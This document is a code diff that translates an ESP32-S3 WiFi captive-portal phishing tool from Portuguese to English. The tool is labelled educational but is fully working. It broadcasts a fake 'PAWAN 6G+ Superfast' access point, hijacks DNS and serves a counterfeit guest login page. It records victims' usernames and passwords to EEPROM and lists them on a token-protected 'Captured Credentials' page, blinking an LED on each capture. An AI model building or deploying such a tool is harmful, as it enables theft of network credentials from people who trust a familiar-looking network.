@@ -1,39 +1,39 @@
 // Captive Portal for ESP32-S3
 // Ported from ESP8266 version by NoceraInfosec
-// Only for educational / lab training purposes.
+// Only for educational or lab training purposes.
 
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <EEPROM.h>
 
-// Password to access credential page
+// Password to access credentials page
 const char* PASSWORD = "P@ssw0rd!";
 
 // Default texts
-#define SUBTITLE "A internet da EMPRESA!"
-#define TITLE "Acesso GUEST"
-#define BODY "Para se conectar a nossa rede insira seu login de rede. Aproveite a internet mais rápida da EMPRESA!"
-#define POST_TITLE "Conectando..."
-#define POST_BODY "Caso seu acesso seja recusado, </br>comunique seu supervisor, Aguarde... </br></br> Obrigado!"
-#define PASS_TITLE "Credenciais"
-#define CLEAR_TITLE "Zeradas"
+#define SUBTITLE "The Internet of PAWAN!"
+#define TITLE "Guest Access"
+#define BODY "To connect to our network, please enter your network login. Enjoy PAWAN's superfast internet!"
+#define POST_TITLE "Connecting..."
+#define POST_BODY "If your access is denied, </br>please contact your supervisor. Please wait... </br></br> Thank you!"
+#define PASS_TITLE "Captured Credentials"
+#define CLEAR_TITLE "Cleared"
 
-// System configs
+// System configurations
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Captive portal IP
 
 // Default SSID
-const char *SSID_NAME = "EMPRESA - GuestWifi";
+const char *SSID_NAME = "PAWAN 6G+ Superfast";
 
-// State
+// State variables
 String allPass = "";
 String newSSID = "";
 String currentSSID = "";
 
-// EEPROM locations
+// EEPROM memory locations
 int initialCheckLocation = 20;
 int passStart = 30;
 int passEnd = passStart;
@@ -43,7 +43,7 @@ unsigned long bootTime = 0, lastActivity = 0, lastTick = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
 
-// -------------------- Helpers ----------------------
+// -------------------- Helper Functions ----------------------
 
 String input(String argName) {
   String a = webServer.arg(argName);
@@ -54,7 +54,7 @@ String input(String argName) {
 }
 
 String footer() {
-  return "</div><div class=q><a>&#169; 2023 Empresa. </br> Todos os direitos Reservados.</a></div>";
+  return "</div><div class=q><a>&#169; 2025 PAWAN Networks. </br> All rights reserved.</a></div>";
 }
 
 String header(String t) {
@@ -75,19 +75,19 @@ String header(String t) {
   return h;
 }
 
-// -------------------- Pages ------------------------
+// -------------------- Web Pages ------------------------
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</div><div><form action=/post method=post><label>Login de rede: EMPRESA\\Usuário </label>"
-         "<input type=text name=u></input><label>Senha:</label>"
-         "<input type=password name=m></input><input type=submit value=Conectar></form>" + footer();
+  return header(TITLE) + "<div>" + BODY + "</div><div><form action=/post method=post><label>Network Login: PAWAN\\User </label>"
+         "<input type=text name=u></input><label>Password:</label>"
+         "<input type=password name=m></input><input type=submit value=Connect></form>" + footer();
 }
 
 String posted() {
   String username = input("u");
   String password = input("m");
 
-  String userPassEntry = "<li><b>Usuário:</b> " + username + "</li><li><b>Senha:</b> " + password + "</li>";
+  String userPassEntry = "<li><b>User:</b> " + username + "</li><li><b>Password:</b> " + password + "</li>";
   allPass += userPassEntry;
 
   for (int i = 0; i <= userPassEntry.length(); ++i) {
@@ -101,15 +101,15 @@ String posted() {
 
 String pass() {
   if (webServer.hasArg("password") && webServer.arg("password") == PASSWORD) {
-    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar</a></p><p><a style=\"color:blue\" href=/clear>Limpar</a></p></center>" + footer();
+    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back</a></p><p><a style=\"color:blue\" href=/clear>Clear</a></p></center>" + footer();
   } else {
-    return header("Área Protegida!") + "<p>Somente pessoal autorizado!</p><form action=\"/pass\" method=\"GET\"><label>TOKEN:</label><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Acessar\"></form>" + footer();
+    return header("Protected Area!") + "<p>Authorized personnel only!</p><form action=\"/pass\" method=\"GET\"><label>Access Token:</label><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Access\"></form>" + footer();
   }
 }
 
 String ssid() {
-  return header("Alterar SSID") + "<form action=/postSSID method=post><label>Novo SSID:</label>"
-         "<input type=text name=s></input><input type=submit value=\"Alterar SSID\"></form>" + footer();
+  return header("Change SSID") + "<form action=/postSSID method=post><label>New SSID:</label>"
+         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
 }
 
 String postedSSID() {
@@ -129,10 +129,10 @@ String clear() {
   passEnd = passStart;
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  return header(CLEAR_TITLE) + "<p>Senhas apagadas.</p><center><a href=/>Voltar</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<p>Stored passwords cleared.</p><center><a href=/>Back</a></center>" + footer();
 }
 
-// Blink LED when password captured
+// Blink LED when password is captured
 void BLINK() {
   for (int counter = 0; counter < 10; counter++) {
     digitalWrite(LED_BUILTIN, counter % 2);
